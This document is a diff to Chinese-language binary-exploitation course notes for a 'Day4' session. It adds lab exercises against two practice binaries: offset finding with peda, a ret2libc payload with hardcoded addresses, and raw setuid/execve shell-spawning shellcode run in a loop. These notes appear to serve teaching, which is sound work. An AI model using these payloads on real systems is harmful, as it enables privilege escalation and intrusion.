@@ -1,4 +1,4 @@
-Day4
+![image](https://github.com/user-attachments/assets/7f3c41b0-f13f-4bc0-952a-b19da3da6e99)![image](https://github.com/user-attachments/assets/3bd53213-6bfe-4b03-8791-5a1d9ce5c689)Day4
 ===
 關閉ASLR
 ---
@@ -176,4 +176,90 @@ ROP
     python -c 'print "A"*24 + "\xc0\x63\xeb\xb7" + "\x45\x83\x04\x08" + "\x00\x00\x00\x00" + "\x40\x64\xeb\xb7" + "\x45\x83\x04\x08" + "\x00\x00\x00\x00" + "\xb0\xfd\xe3\xb7" + "\xe0\x39\xe3\xb7" + "\x2b\x0b\xf6\xb7"' > badfile
     ./retlib
 ![image](https://github.com/user-attachments/assets/00357a78-1916-499b-a588-9104ae49dc26)
+
+補充練習
+---
+    安裝peda
+    https://github.com/longld/peda
+    git clone https://github.com/longld/peda.git ~/peda
+    echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+    challenge-one
+    ./challenge-one
+![image](https://github.com/user-attachments/assets/fda9b0c9-72b3-4da5-9a0e-476a8d1b3a8c)
+
+    確認檔案資訊
+    file challenge-one
+![image](https://github.com/user-attachments/assets/ed725ee2-0d8b-41e7-b09d-c0583d543347)
+
+    確認程式碼開啟的防護機制
+    gdb ./challenge-one
+    checksec
+![image](https://github.com/user-attachments/assets/0f2254a3-8d93-4222-885c-2d8dac83a4b7)
+
+    反組譯程式碼
+    disassemble main
+![image](https://github.com/user-attachments/assets/c74ad230-7adf-48fc-8ae4-8aa83f192cf5)
+
+    塞值讓程式報錯
+    pattern create 100 
+    r
+![image](https://github.com/user-attachments/assets/9db1305a-a110-4e8e-95f8-e5f0c75f6d59)
+
+    找到ret address位置在第44bit
+    pattern search
+![image](https://github.com/user-attachments/assets/64dff4be-092d-4818-a461-2f125ba753fb)
+
+    編輯exp_challenge-one.py，找出堆疊的起始值並替換檔案內的植，程式碼用pyton2執行
+![image](https://github.com/user-attachments/assets/8a30e97c-62cf-4713-afa2-25108c7d7eac)
+![image](https://github.com/user-attachments/assets/dc072aec-4fe3-43d1-b0a3-dc6d8628629d)
+
+    執行程式碼
+    while true; do (python2 exp_challenge-one.py; python2 -c 'import sys;sys.stdout.write("
+\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\
+x69\x6e\x89\xe3\xcd\x80")';cat) | ./challenge-one; done
+----------------------------------------------------------
+    level-two
+    ./level-two
+![image](https://github.com/user-attachments/assets/b1241eda-6e2f-442b-beec-d2b1c6d5f9ae)
+
+    確認檔案資訊
+    file level-two
+![image](https://github.com/user-attachments/assets/99bcc9f8-cb08-4e61-8bb5-ba9c5f10dcaf)
+
+    確認程式碼保護機制
+    gdb ./level-two
+    checksec
+![image](https://github.com/user-attachments/assets/544eabf1-840a-497e-af97-f00e1fc43dfc)
+
+    塞值讓程式碼報錯
+    pattern create 500
+    r
+![image](https://github.com/user-attachments/assets/f29155df-1430-4c1a-90df-0ec7256f3ed7)
+
+    找到ret address位置在140bit
+    pattern search
+![image](https://github.com/user-attachments/assets/add4a4c3-94b1-4dbb-824a-85ca55f0cd55)
+
+    找level-two，uid、gid、system、exit、/bin/sh機器語言的值，利用寫好的py執行
+    p setuid
+    p setgid
+    p system
+    p exit
+    find /bin/sh
+![image](https://github.com/user-attachments/assets/1e974e99-7bfd-4ad0-b7f8-2db7d534f0fd)
+![image](https://github.com/user-attachments/assets/b10ec0c0-7d75-46d5-9621-ce88ba8895d6)
+
+    替換py裡面的值
+![image](https://github.com/user-attachments/assets/111aab16-a049-4b01-8371-93c568428e13)
+
+    執行程式碼
+    while true; do (python2 ./exp_leveltwo.py; cat) | ./level-two; done
+    
+
+    
+
+
+
+    
 
